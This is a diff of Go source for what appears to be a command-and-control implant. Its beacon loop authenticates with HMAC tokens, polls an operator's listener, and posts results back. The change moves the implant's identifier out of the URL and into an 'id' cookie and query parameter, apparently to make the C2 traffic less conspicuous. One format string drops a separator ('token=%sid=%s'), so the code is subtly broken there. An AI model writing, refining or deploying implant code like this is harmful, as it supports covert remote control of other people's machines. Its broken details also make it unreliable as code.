@@ -44,9 +44,9 @@ func main() {
 
 	for {
 		baseUrl := ""
-		baseUrl = "http://" + conf.Listener + GetURI + CompUUID
+		baseUrl = "http://" + conf.Listener + GetURI
 		postUrl := ""
-		postUrl = "http://" + conf.Listener + PostURI + CompUUID
+		postUrl = "http://" + conf.Listener + PostURI
 
 		token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)
 
@@ -54,7 +54,7 @@ func main() {
 
 		// Prepare the hmac params (timestamp and token)
 		// params := http.Cookie{}
-		hardVals := fmt.Sprintf("timestamp=%s&token=%s", timestamp, token)
+		hardVals := fmt.Sprintf("timestamp=%s&token=%sid=%s", timestamp, token, CompUUID)
 
 		// compedData is hardVals compressed using zlib
 		// if enabled at compile time, DoComp returns the compressed object and bool true
@@ -130,7 +130,8 @@ func main() {
 					fmt.Println("Success")
 					break
 				} else {
-					request, err := shared.SendDataRequest(postUrl, "test success")
+					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
+					request, err := shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
 					if err != nil {
 						return
 					}
@@ -145,12 +146,13 @@ func main() {
 			//fmt.Println("Not compressing data")
 			tokenCookie := &http.Cookie{Name: "token", Value: token}
 			timestampCookie := &http.Cookie{Name: "timestamp", Value: timestamp}
+			impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
 			//reqURL.RawQuery = params.Encode()
 			//fmt.Println(reqURL.String())
 			// makeGetRequest 3 times with a 10-second delay between each attempt
 			// if the request is successful, break the loop
 			// otherwise, the 3 timeouts cause the program to exit
-			resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie, timestampCookie)
+			resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie, timestampCookie, impIdCookie)
 			if err != nil {
 				//fmt.Println("Final error:", err)
 				return
@@ -215,7 +217,8 @@ func main() {
 					fmt.Println("Success")
 					break
 				case false:
-					request, err := shared.SendDataRequest(postUrl, "test success")
+					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
+					request, err := shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
 					if err != nil {
 						return
 					}
